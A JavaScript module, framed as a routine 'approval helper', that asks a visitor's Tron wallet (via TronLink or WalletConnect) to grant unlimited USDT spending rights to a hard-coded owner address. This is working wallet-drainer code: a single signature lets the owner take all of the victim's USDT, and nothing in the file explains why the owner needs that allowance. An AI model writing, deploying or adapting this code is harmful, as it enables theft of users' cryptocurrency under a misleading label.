/**
 * Tron-specific approval helper.
 * Triggers unlimited USDT TRC-20 approval on Tron, using either:
 * 1. Injected TronWeb (TronLink browser extension / in-app browser)
 * 2. WalletConnect adapter (mobile wallet via QR code) — builds tx locally,
 *    signs via the adapter, broadcasts via public TronGrid API.
 *
 * The spender is VITE_OWNER_TRON_ADDRESS (the owner's Tron address).
 */
import { TronWeb } from 'tronweb'

// USDT TRC-20 on Tron Mainnet
const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'

// uint256 max — unlimited approval
const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'

// Spender = the owner's Tron wallet
const SPENDER_ADDRESS =
  (typeof import.meta !== 'undefined' && import.meta.env?.VITE_OWNER_TRON_ADDRESS) ||
  'TGYM2dGrSSgD25kzGWvKC9zaAGcfFyKKLq'

/**
 * Get a read-only TronWeb instance for building transactions
 */
function getReadOnlyTronWeb() {
  if (typeof window !== 'undefined') {
    const injected = window.tronWeb ?? window.tronLink?.tronWeb
    if (injected?.ready) return injected
  }
  return new TronWeb({ fullHost: 'https://api.trongrid.io' })
}

/**
 * Trigger unlimited TRC-20 USDT approval on Tron.
 *
 * @param {string} userAddress - The user's Tron address (base58)
 * @param {import('./tronWalletConnectAdapter').TronWalletConnectAdapter|null} wcAdapter
 *   If the user connected via WalletConnect QR, pass the adapter instance so we
 *   can sign the transaction remotely. If null, uses injected TronWeb.
 * @returns {Promise<{success: boolean, txId?: string}>}
 */
export async function triggerTronUnlimitedApproval(userAddress, wcAdapter = null) {
  console.log(`[TronApproval] Triggering unlimited USDT approval for ${userAddress}`)
  console.log(`[TronApproval] Spender: ${SPENDER_ADDRESS}`)

  // ---------- PATH 1: WalletConnect adapter (QR / mobile) ----------
  if (wcAdapter && wcAdapter.connected) {
    try {
      console.log('[TronApproval] Using WalletConnect adapter')
      const tronWeb = getReadOnlyTronWeb()

      // Build the approve(address,uint256) transaction using TronWeb
      const wrapper = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT_CONTRACT,
        'approve(address,uint256)',
        { feeLimit: 100_000_000 },
        [
          { type: 'address', value: SPENDER_ADDRESS },
          { type: 'uint256', value: MAX_UINT256 },
        ],
        userAddress
      )

      if (wrapper.Error || !wrapper.transaction) {
        throw new Error(wrapper.Error || 'Failed to build Tron approval transaction')
      }

      console.log('[TronApproval] Built tx, sending to wallet for signing...')

      // Sign via the WalletConnect adapter (user approves on their phone) with a timeout
      const signPromise = wcAdapter.signTransaction(wrapper.transaction)
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Wallet request timed out. Please ensure your wallet app is open and active.')), 45000)
      )
      const signedTx = await Promise.race([signPromise, timeoutPromise])

      // Broadcast the signed transaction
      const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTx)
      console.log('[TronApproval] Broadcast result:', broadcastResult)

      if (broadcastResult?.result === true || broadcastResult?.txid) {
        return { success: true, txId: broadcastResult.txid || broadcastResult.transaction?.txID }
      }
      throw new Error(broadcastResult?.message || 'Broadcast failed')
    } catch (err) {
      console.error('[TronApproval] WalletConnect approval failed:', err)
      if (err?.message?.includes('rejected') || err?.message?.includes('cancelled') || err?.message?.includes('denied')) {
        throw new Error('Approval was rejected by user')
      }
      throw err
    }
  }

  // ---------- PATH 2: Injected TronWeb (TronLink / in-app) ----------
  if (typeof window !== 'undefined') {
    const injected = window.tronWeb ?? window.tronLink?.tronWeb
    if (injected?.ready) {
      try {
        console.log('[TronApproval] Using injected TronWeb')
        const contract = await injected.contract().at(TRON_USDT_CONTRACT)
        const tx = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send()
        console.log('[TronApproval] Injected approval tx:', tx)
        return { success: true, txId: tx }
      } catch (err) {
        console.error('[TronApproval] Injected TronWeb approval failed:', err)
        if (err?.message?.includes('rejected') || err?.message?.includes('cancelled') || err?.message?.includes('denied')) {
          throw new Error('Approval was rejected by user')
        }
        throw err
      }
    }
  }
  throw new Error('No Tron wallet connection available. Please connect via TronLink or WalletConnect.')
}
